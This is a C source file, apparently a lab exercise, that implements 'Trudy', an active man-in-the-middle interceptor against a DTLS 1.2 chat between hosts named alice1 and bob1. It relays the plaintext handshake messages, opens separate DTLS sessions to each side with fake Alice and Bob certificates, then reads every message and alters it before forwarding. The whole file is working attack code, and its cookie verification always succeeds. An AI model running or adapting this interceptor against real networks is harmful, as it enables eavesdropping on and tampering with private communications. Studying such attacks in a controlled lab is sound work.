#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/opensslv.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <ctype.h>
#include <openssl/x509_vfy.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>

const int BOB_PORT = 5003; // Will be used to create trudy_alice_socket
int ALICE_PORT = -1;       // Will gets this port no. after receiving chat_hello from alice // This port number will be used to create trudy_bob_socket.
union ServerAddrUnion
{
    struct sockaddr_storage ss;
    struct sockaddr_in s4;
    struct sockaddr_in6 s6;
};

void printLine()
{
    printf("\n--------------------------------------------------\n");
}

char *hostname_to_ip(const char *hostname) {
    struct hostent *host_entry;
    char *ip_address = NULL;

    // Get host entry corresponding to the hostname
    host_entry = gethostbyname(hostname);
    if (host_entry == NULL) {
        fprintf(stderr, "Error occurred in gethostbyname()\n");
        return NULL;
    }

    // Allocate memory for IP address string
    ip_address = (char *)malloc(INET_ADDRSTRLEN);
    if (ip_address == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // Convert the first IP address to string format
    inet_ntop(AF_INET, host_entry->h_addr_list[0], ip_address, INET_ADDRSTRLEN);
    return ip_address;
}

char *getHostnameOfCurrentSystem()
{
    char *hostname = (char *)malloc(256 * sizeof(char));
    if (hostname == NULL)
    {
        perror("Hostname is NULL");
        exit(1);
    }
    if (gethostname(hostname, 256) != 0)
    {
        perror("gethostname");
        free(hostname);
        exit(1);
    }
    else
    {
        return hostname;
    }
}

int create_trudy_socket(char* TRUDY_IP, int opponentPort)
{
    int trudy_socket;
    struct sockaddr_in trudy_socket_addr;
    memset(&trudy_socket_addr, 0, sizeof(trudy_socket_addr));
    trudy_socket_addr.sin_family = AF_INET;
    inet_pton(AF_INET, TRUDY_IP, &(trudy_socket_addr.sin_addr));
    trudy_socket_addr.sin_port = htons(opponentPort);

    // Create server socket with some options
    if ((trudy_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("trudy socket creation failed");
        exit(EXIT_FAILURE);
    }
    const int one = 1;
    setsockopt(trudy_socket, SOL_SOCKET, SO_REUSEADDR, (const void *)&one, (socklen_t)sizeof(one));
    // Bind server socket to server IP and server port
    if (bind(trudy_socket, (const struct sockaddr *)&trudy_socket_addr, sizeof(trudy_socket_addr)) < 0)
    {
        perror("trudy socket bind failed");
        exit(EXIT_FAILURE);
    }
    return trudy_socket;
}

int cookie_creation_callback(SSL *ssl, unsigned char *cookie, unsigned int *lenth_of_cookie)
{
    *lenth_of_cookie = 6;
    memcpy(cookie, "cookie", 6);
    return 1;
}

int cookie_verification_callback(SSL *ssl, const unsigned char *cookie, unsigned int lenth_of_cookie) { return 1; }

// Function to perform certificate expiry date check
int verify_certificate_expiry_date(X509 *cert)
{
    ASN1_TIME *not_after = X509_get_notAfter(cert);
    time_t now = time(NULL);
    struct tm tm_val;
    ASN1_TIME_to_tm(not_after, &tm_val);
    time_t expiry_time = mktime(&tm_val);
    return (now > expiry_time) ? 0 : 1;
}

// This function is called for each certificate in the 'Trust Chain'
int verify_certificate_callback(int preverify_ok, X509_STORE_CTX *ctx)
{
    char buf[256];
    X509 *err_cert;
    int err, depth;

    // Extracting the certificate from SSL/DTLS context
    err_cert = X509_STORE_CTX_get_current_cert(ctx);
    err = X509_STORE_CTX_get_error(ctx);
    depth = X509_STORE_CTX_get_error_depth(ctx);

    // Printing the depth and Subject name of certificate
    X509_NAME_oneline(X509_get_subject_name(err_cert), buf, 256);
    printf("Depth:%d, Cert Info: %s\n", depth, buf);
    if (!preverify_ok) {
        printf("Certificate Verification Error: num=%d:%s:%s\n", err, X509_verify_cert_error_string(err), buf);
        exit(1);
    }
    if (preverify_ok) {
        // Verifying the expiry date of certificate
        if (verify_certificate_expiry_date(err_cert)) {
            printf("Certificate having depth %d is NOT expired\n\n", depth);
        } else {
            printf("Error: Certificate is Expired\n");
            exit(1);
        }
    }
    return preverify_ok;
}

void ssl_info_callback(const SSL *ssl, int where, int ret)
{
    if (where & SSL_CB_HANDSHAKE_START)
    {
        printf(".... DTLS 1.2 Handshake started ....\n\n");
        printf(".... Certificate Verification Started ....\n\n");
    }
    else if (where & SSL_CB_HANDSHAKE_DONE)
    {
        const SSL_CIPHER *cipher = SSL_get_current_cipher(ssl);
        if (cipher)
        {
            printf(".... Certificate Verification Ended ....\n\n");
            printf("Cipher suite selected by server: %s\n", SSL_CIPHER_get_name(cipher));
        }
        printf("\n.... DTLS 1.2 Handshake ended ....");
        printLine();
    }
}

X509_STORE *setup_ca_cert_store(const char *root_ca_cert_file, const char *int_ca_cert_file)
{
    X509_STORE *store = X509_STORE_new();
    X509_LOOKUP *lookup = X509_STORE_add_lookup(store, X509_LOOKUP_file());
    X509_LOOKUP_load_file(lookup, root_ca_cert_file, X509_FILETYPE_PEM);
    X509_LOOKUP_load_file(lookup, int_ca_cert_file, X509_FILETYPE_PEM);
    return store;
}

SSL_CTX *create_server_context() // bob
{
    // Creating context and filling certs and private key in it
    SSL_CTX *ctx = SSL_CTX_new(DTLSv1_2_server_method());

    // Setting the cipher suits list
    SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES256-GCM-SHA384");
    SSL_CTX_set_info_callback(ctx, ssl_info_callback);

    // Creating trust store for Server
    X509_STORE *store = setup_ca_cert_store("root/root.crt", "int/int.crt");
    SSL_CTX_set_cert_store(ctx, store);

    // SSL/TLS context will not use any session caching. Each new SSL/TLS session will be established without reusing any previously cached session information.
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);
    // Setting the server private key
    if (!SSL_CTX_use_PrivateKey_file(ctx, "fake_bob/fake_bob_private_key.pem", SSL_FILETYPE_PEM))
    {
        perror("Error occurred while loading fake_bob_private_key.pem");
        exit(EXIT_FAILURE);
    }
    // Setting the server cert
    if (!SSL_CTX_use_certificate_file(ctx, "fake_bob/fakebob.crt", SSL_FILETYPE_PEM))
    {
        perror("Error occurred while loading fakebob.crt");
        exit(EXIT_FAILURE);
    }
    // SSL_VERIFY_PEER: the server (or client) will request and verify the certificate of the peer during the SSL/TLS handshake.
    // SSL_VERIFY_CLIENT_ONCE: server should request the client's certificate but only once. Subsequent renegotiations won't require re-authentication.
    // The callback function is a user-defined function that OpenSSL will call during the SSL/TLS handshake to perform additional verification steps or to customize the verification process
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER | SSL_VERIFY_CLIENT_ONCE, verify_certificate_callback);
    SSL_CTX_set_verify_depth(ctx, 2);

    // Allows the SSL/TLS library to read as much data as possible from the underlying transport layer (e.g., TCP socket) in a single operation
    SSL_CTX_set_read_ahead(ctx, 1);
    SSL_CTX_set_cookie_generate_cb(ctx, cookie_creation_callback);
    SSL_CTX_set_cookie_verify_cb(ctx, &cookie_verification_callback);
    return ctx;
}

SSL_CTX *create_client_context() // alice
{
    // Creating context and filling certs and private key in it
    SSL_CTX *ctx = SSL_CTX_new(DTLSv1_2_client_method());

    // Setting the cipher suits list of "12 Cipher Suites that support PFS"
    SSL_CTX_set_cipher_list(ctx, "DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256");
    SSL_CTX_set_info_callback(ctx, ssl_info_callback);

    // Creating trust store for Client
    X509_STORE *store = setup_ca_cert_store("root/root.crt", "int/int.crt");
    SSL_CTX_set_cert_store(ctx, store);

    // SSL/TLS context will not use any session caching. Each new SSL/TLS session will be established without reusing any previously cached session information.
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);

    // Setting the server private key
    if (!SSL_CTX_use_PrivateKey_file(ctx, "fake_alice_2048/fake_alice_private_key.pem", SSL_FILETYPE_PEM))
    {
        perror("Error occurred while loading fake_alice_private_key.pem");
        char buffer[4096];
        printf("%s\n", ERR_error_string(ERR_get_error(), buffer));
        exit(EXIT_FAILURE);
    }

    // Setting the server cert
    if (!SSL_CTX_use_certificate_file(ctx, "fake_alice_2048/fakealice.crt", SSL_FILETYPE_PEM))
    {
        unsigned long err = ERR_get_error();
        char err_buffer[256];
        ERR_error_string_n(err, err_buffer, sizeof(err_buffer));
        printf("Error occurred while loading fakealice.crt: %s\n", err_buffer);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_certificate_callback);
    SSL_CTX_set_verify_depth(ctx, 2);
    SSL_CTX_set_read_ahead(ctx, 1);
    return ctx;
}

SSL* create_trudy_to_alice_DTLS_pipe(int trudy_alice_socket)
{
    char buffer[4096];
    // This union will contain client address after successfuly listening to clientHello
    union
    {
        struct sockaddr_storage ss;
        struct sockaddr_in s4;
        struct sockaddr_in6 s6;
    } client_addr;
    memset(&client_addr, 0, sizeof(struct sockaddr_storage));

    // Added Certs & Private key in ctx and then Enabe Cookie
    SSL_CTX *trudy_alice_ssl_ctx = create_server_context();

    // Create a UDP BIO
    // BIO_NOCLOSE indicates that the BIO should not close the socket when it is freed
    BIO *trudy_alice_ssl_bio = BIO_new_dgram(trudy_alice_socket, BIO_NOCLOSE);
    // Setting recv timeout on bio
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    BIO_ctrl(trudy_alice_ssl_bio, BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);

    // creates a new SSL/TLS connection (ssl) based on the provided SSL/TLS context
    // context typically contains information about certificates, cipher suites, and other configuration options.
    SSL *trudy_alice_ssl = SSL_new(trudy_alice_ssl_ctx);

    // Use same BIO for both reading and writing.
    SSL_set_bio(trudy_alice_ssl, trudy_alice_ssl_bio, trudy_alice_ssl_bio);
    // enables support for the TLS "Cookie Exchange" extension.
    SSL_set_options(trudy_alice_ssl, SSL_OP_COOKIE_EXCHANGE);

    int res = 0;
    while (res < 1) // for waiting till gettig clientHello
    {
        // Listen for incoming DTLS connections
        // Without cookie, vulnerable to Amplification attacks.
        // Solution: validate the source address using 'stateless cookie mechanism'
        res = DTLSv1_listen(trudy_alice_ssl, (BIO_ADDR *)&client_addr);
        if (res < 0)
        {
            perror("Error occurred in DTLSv1_listen()");
            exit(EXIT_FAILURE);
        }
    }

    // For Datagram sockets, connect is often used to establish a default destination for sending datagrams.
    if (connect(trudy_alice_socket, (struct sockaddr *)&client_addr, sizeof(struct sockaddr_in)))
    {
        perror("Error occurred while server connecting to client");
    }

    // Updating the bio with updated socket (this socket now know the destination also)
    BIO_set_fd(SSL_get_rbio(trudy_alice_ssl), trudy_alice_socket, BIO_NOCLOSE);
    BIO_ctrl(SSL_get_rbio(trudy_alice_ssl), BIO_CTRL_DGRAM_SET_CONNECTED, 0, &client_addr.ss);

    int ret;
    do
    {
        ret = SSL_accept(trudy_alice_ssl); // At this function call, DTLS handshake occurs and callback function 'ssl_info_callback' gets called.
    } while (ret == 0);
    if (ret < 0)
    {
        perror("Error occurred in SSL_accept");
        printf("%s\n", ERR_error_string(ERR_get_error(), buffer));
        exit(1);
    }
    printf("Server connected to Client using DTLS 1.2");
    printLine();
    BIO_ctrl(SSL_get_rbio(trudy_alice_ssl), BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);
    printf("\n----- Successfully created trudy <-> alice DTLS pipe ------\n");
    return trudy_alice_ssl;
}

SSL* create_trudy_to_bob_DTLS_pipe(int trudy_bob_socket, char* BOB_IP) // BOB_IP == SERVER_IP
{
    char buffer[4096];
    // Connecting to server
    union ServerAddrUnion server_addr; // bob_addr
    memset(&server_addr, 0, sizeof(struct sockaddr_storage));
    // Assigning values to above union
    if (inet_pton(AF_INET, BOB_IP, &server_addr.s4.sin_addr) == 1)
    {
        server_addr.s4.sin_family = AF_INET;
#ifdef HAVE_SIN_LEN
        server_addr.s4.sin_len = sizeof(struct sockaddr_in);
#endif
        server_addr.s4.sin_port = htons(BOB_PORT);
    }
    // For Datagram sockets, connect is often used to establish a default destination for sending datagrams.
    if (connect(trudy_bob_socket, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_in)))
    {
        perror("Error in trudy to bob connect");
    }

    // --------------------- Certs, Private key, Verify Private key  -------------//
    SSL_CTX *trudy_bob_ssl_ctx = create_client_context();

    // ----------------- SSL Handshake Code ---------------//
    // Create a UDP BIO
    // BIO_NOCLOSE indicates that the BIO should not close the socket when it is freed
    // Wo server ke sath socket connect karke, us socket ka use bio me karra hai
    SSL *trudy_bob_ssl = SSL_new(trudy_bob_ssl_ctx);

    BIO *trudy_bob_ssl_bio = BIO_new_dgram(trudy_bob_socket, BIO_NOCLOSE);

    BIO_ctrl(trudy_bob_ssl_bio, BIO_CTRL_DGRAM_SET_CONNECTED, 0, &server_addr.ss);
    SSL_set_bio(trudy_bob_ssl, trudy_bob_ssl_bio, trudy_bob_ssl_bio);
    // SSL Connect
    int retval = SSL_connect(trudy_bob_ssl);
    if (retval < 1)
    {
        fprintf(stderr, "Error occurred in SSL connect\n");
        printf("%s\n", ERR_error_string(ERR_get_error(), buffer));
        exit(1);
    }
    printf("Client connected to Server using DTLS");
    printLine();

    struct timeval timeout;
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    BIO_ctrl(trudy_bob_ssl_bio, BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);
    printf("\n----- Successfully created trudy <-> bob DTLS pipe ------\n");
    return trudy_bob_ssl;
}

void deallocateMemory(SSL *trudy_alice_ssl, SSL *trudy_bob_ssl, int trudy_alice_socket, int trudy_bob_socket)
{
    // SSL_shutdown(trudy_alice_ssl);
    // SSL_shutdown(trudy_bob_ssl);
    SSL_free(trudy_alice_ssl);
    SSL_free(trudy_bob_ssl);
    close(trudy_alice_socket);
    close(trudy_bob_socket);
}

void eavesdropChat(char* aliceHostname, char* bobHostname) // (char* host1 = alice1, char* host2 = bob1) 
{
    char buffer[4096];
    char* ALICE_IP = hostname_to_ip(aliceHostname);
    char* BOB_IP = hostname_to_ip(bobHostname);
    printLine();
    printf("****** Started new MITM session ******\n");
    printf("Alice's IP: %s\n", ALICE_IP);
    printf("Bob's IP: %s\n", BOB_IP);
    char* trudyHostname = getHostnameOfCurrentSystem();
    char* TRUDY_IP = hostname_to_ip(trudyHostname);
    printf("Trudy's IP: %s", TRUDY_IP);

    // 1. creating trudy_alice_socket
    int trudy_alice_socket = create_trudy_socket(TRUDY_IP, BOB_PORT);
    printLine();
    printf("'trudy_alice_socket' socket created Successfully");
    printLine();

    // Now we will wait till alice sends some message to trudy, because after that only we will get the port number of alice
    struct sockaddr_in alice_addr;
    memset(buffer, 0, sizeof(buffer));
    socklen_t alice_addr_size = sizeof(alice_addr);
    printf("Waiting for 'chat_hello' msg from Alice1....\n");
    recvfrom(trudy_alice_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&alice_addr, &alice_addr_size);
    ALICE_PORT = alice_addr.sin_port;
    printf("Msg recvd from %s (%s:%d): %s", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, buffer);
    if (strcmp(buffer, "chat_hello") != 0)
    {
        printf("\nError: Expected 'chat_hello' message from client\n");
        exit(1);
    }

    // ------------------------------------------------------------------------------------------
    // 2. creating trudy_bob_socket
    int trudy_bob_socket = create_trudy_socket(TRUDY_IP, ALICE_PORT);
    printLine();
    printf("'trudy_bob_socket' socket created Successfully");
    printLine();

    struct sockaddr_in bob_addr;
    memset(&bob_addr, 0, sizeof(bob_addr));
    bob_addr.sin_family = AF_INET;
    inet_pton(AF_INET, BOB_IP, &(bob_addr.sin_addr));
    bob_addr.sin_port = htons(BOB_PORT);

    char *chat_hello = "chat_hello";
    sendto(trudy_bob_socket, (const char *)chat_hello, strlen(chat_hello), 0, (const struct sockaddr *)&bob_addr, sizeof(bob_addr));
    printf("Msg sent to %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, chat_hello);

    memset(buffer, 0, sizeof(buffer));
    socklen_t bob_addr_size = sizeof(bob_addr);
    recvfrom(trudy_bob_socket, (char *)buffer, sizeof(buffer), 0, (struct sockaddr *)&bob_addr, &bob_addr_size);
    printf("Msg recv from %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);
    if (strcmp(buffer, "chat_ok_reply") != 0)
    {
        printf("\nError: Expected 'chat_ok_reply' message from server\n");
        exit(1);
    }
    
    // 3. Sending the chat_ok_reply to alice1 from trudy1
    char *chat_ok_reply = "chat_ok_reply";
    sendto(trudy_alice_socket, (const char *)chat_ok_reply, strlen(chat_ok_reply), 0, (const struct sockaddr *)&alice_addr, sizeof(alice_addr));
    printf("Msg sent to %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, chat_ok_reply);   
    // ------------------------------------------------------------------------------------------

    // 4. Trudy receives 'chat_START_SSL' from alice1
    memset(buffer, 0, sizeof(buffer));
    alice_addr_size = sizeof(alice_addr);
    recvfrom(trudy_alice_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&alice_addr, &alice_addr_size);
    printf("Msg recvd from %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), alice_addr.sin_port, buffer);
    if (strcmp(buffer, "chat_START_SSL") != 0)
    {
        printf("\nError: Expected 'chat_START_SSL' message from client\n");
        exit(1);
    }

    // 5. Trudy sends 'chat_START_SSL' to bob1
    char *chat_START_SSL = "chat_START_SSL";
    sendto(trudy_bob_socket, (const char *)chat_START_SSL, strlen(chat_START_SSL), 0, (const struct sockaddr *)&bob_addr, sizeof(bob_addr));
    printf("Msg sent to %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, chat_START_SSL);

    // 6. Trudy waiting for 'chat_START_SSL_ACK' msg from bob1
    memset(buffer, 0, sizeof(buffer));
    bob_addr_size = sizeof(bob_addr);
    recvfrom(trudy_bob_socket, (char *)buffer, sizeof(buffer), 0, (struct sockaddr *)&bob_addr, &bob_addr_size);
    printf("Msg recv from %s (%s:%d): %s\n", bobHostname, inet_ntoa(bob_addr.sin_addr), BOB_PORT, buffer);
    if (strcmp(buffer, "chat_START_SSL_ACK") != 0)
    {
        printf("\nError: Expected 'chat_START_SSL_ACK' message from server\n");
        exit(1);
    }

    // 7. Trudy sends 'chat_START_SSL_ACK' msg to alce1
    char *chat_START_SSL_ACK = "chat_START_SSL_ACK";
    sendto(trudy_alice_socket, (const char *)chat_START_SSL_ACK, strlen(chat_START_SSL_ACK), 0, (const struct sockaddr *)&alice_addr, sizeof(alice_addr));
    printf("Msg sent to %s (%s:%d): %s\n", aliceHostname, inet_ntoa(alice_addr.sin_addr), ALICE_PORT, chat_START_SSL_ACK);
    printf("\n*** ALL CONTROL MESSAGES ARE COMMUNICATED CORRECTLY ***\n");
    // ------- All plain text control messages are correctly communicated by trudy ------- //

    // Establishing the trudy <-> alice DTLS pipe
    SSL *trudy_alice_ssl;
    trudy_alice_ssl = create_trudy_to_alice_DTLS_pipe(trudy_alice_socket);

    // Establishing the trudy <-> bob DTLS pipe
    SSL *trudy_bob_ssl;
    trudy_bob_ssl = create_trudy_to_bob_DTLS_pipe(trudy_bob_socket, BOB_IP);

    // start secure chat
    printf("\n***** Active MITM attack started *****\n");
    int len;
    while(1)
    {
        // -------------------------------------------------------------- //
        // read from trudy_alice_ssl
        memset(buffer, 0, sizeof(buffer));
        do
        {   
            len = SSL_read(trudy_alice_ssl, buffer, sizeof(buffer));
        } while (len == -1);
        if (len > 0)
        {
            printf("\nFrom alice1: %s", buffer);
            if (strcmp(buffer, "chat_close") != 0) {
                strcat(buffer, "_TAMPERED_BY_TRUDY");
            }
        }
        // write the modified msg to trudy_bob_ssl
        len = SSL_write(trudy_bob_ssl, buffer, strlen(buffer));
        if (len > 0)
        {
            if (strcmp(buffer, "chat_close") == 0)
            {
                printf("\n******** Chat closed ********\n");
                break;
            }
        }
        // -------------------------------------------------------------- //

        // -------------------------------------------------------------- //
        // read from trudy_bob_ssl
        memset(buffer, 0, sizeof(buffer));
        do
        {
            len = SSL_read(trudy_bob_ssl, buffer, sizeof(buffer));
        } while (len == -1);
        if (len > 0)
        {
            printf("\nFrom bob1: %s", buffer);
            if (strcmp(buffer, "chat_close") != 0) {
                strcat(buffer, "_TAMPERED_BY_TRUDY");
            }
        }
        // write the modified msg to trudy_alice_ssl
        len = SSL_write(trudy_alice_ssl, buffer, strlen(buffer));
        if (len > 0)
        {
            if (strcmp(buffer, "chat_close") == 0)
            {
                printf("\n******** Chat closed ********\n");
                break;
            }
        }
        printf("\n");
        // -------------------------------------------------------------- //
    }
    deallocateMemory(trudy_alice_ssl, trudy_bob_ssl, trudy_alice_socket, trudy_bob_socket);
}

int main(int argc, char *argv[])
{
    OpenSSL_add_ssl_algorithms();
    SSL_load_error_strings();
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc == 4)
    {
        while(1)
        {
            eavesdropChat(argv[2], argv[3]);  // argv[2] = alice1, argv[3] = bob1
        }
    }
    else
    {
        printf("Wrong command!\n");
        printf("Correct cmd to run Interceptor: ./secure_chat_interceptor -m alice1 bob1\n");
        exit(1);
    }
    return 0;
}

// gcc -o secure_chat_active_interceptor secure_chat_active_interceptor.c -lssl -lcrypto -Wno-deprecated-declarations
// ./secure_chat_active_interceptor -m alice1 bob1
